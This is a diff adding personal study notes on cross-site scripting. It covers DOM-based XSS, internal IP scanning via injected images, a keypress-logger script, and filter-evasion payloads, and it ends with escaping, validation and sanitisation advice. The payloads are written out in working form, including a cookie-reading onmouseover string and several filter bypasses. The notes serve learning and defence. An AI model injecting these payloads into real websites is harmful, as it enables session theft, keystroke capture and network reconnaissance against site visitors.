@@ -31,4 +31,81 @@ Reflected XSS
 2. victim clicks link and taken to vuln website
 3. link containing the attacker's script is executed on website
 4. attacker's script sends data back to the attacker, taking over victims account
+
+--------------------------------------------------------------------------------------------
+
+DOM-Based XSS
+
+-malicious payload is not actually parsed by the victim's browser until the website's legitimate javascript is executed
+-an attacker's payload will only be executed when the vulnerable javascript code is either loaded or interacted with
+eg: 
+var keyword = document.querySelector('#search')
+keyword.innerHTML = <script>...</script>
+
+test" onmouseover="alert('Hover over the image and inspect the image element')"
+test" onmouseover="alert(document.cookie)"
+test" onmouseover="document.body.style.backgroundColor = 'red';
+
+-------------------------------------------------------------------------------------
+
+Using XSS for IP and Port Scanning
+
+-ability to scan a victims internal network and look for open ports
+
+eg:
+<script>
+	for(let i = 0; i < 256; i++){
+		let ip = '192.168.0.' + i
+		let code = '<img src="http://' + ip + '/favicon.ico"
+		onload = "this.onerror=null; this.src=/log/' + ip + '">'
+		document.body.innerHTML += code
+	}
+</script>
+
+-------------------------------------------------------------------------------------
+
+XSS Keylogger
+-creating an event to listen for key-presses
+<script type="text/javascript">
+	let l = "";
+	document.onkeypress = function(e){
+		l += e.key;
+		console.log(l);
+	}
+</script>
+
+--------------------------------------------------------------------------------------
+
+Filter Evasion
+
+Bypass the filter that removes any script tags
+<img src=x onerror=alert('Hello');>
+
+The word alert is filtered, bypass it.
+0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
+
+The word hello is filtered, bypass it.
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('Hello')"></xss>
+
+last:
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('Hello')"></xss>
+
+
+----------------------------------------------------------------------------------
+
+
+Protextion Methods & other exploits
+
+Protection Methods:
+1. Escaping: Escape all user input. Data received is secure before rendering it. eg: disallow < and > characters from being rendered
+2. Validating Input: process of ensuring application is rendering the correct data and preventing malicious data from doing harm to site, database and users. Disallow certain characters from being submitted in the first place
+3. Sanitize: Helpful on sites that allow HTML markup. eg: sanitize '<' into HTML entity &#60;
+
+Other Exploits
+-stringing several vulns together to produce a bigger/better exploit
+-BeEF: pen testing tool for web browser; use client-side attack vectors.
+
+
+
+
  
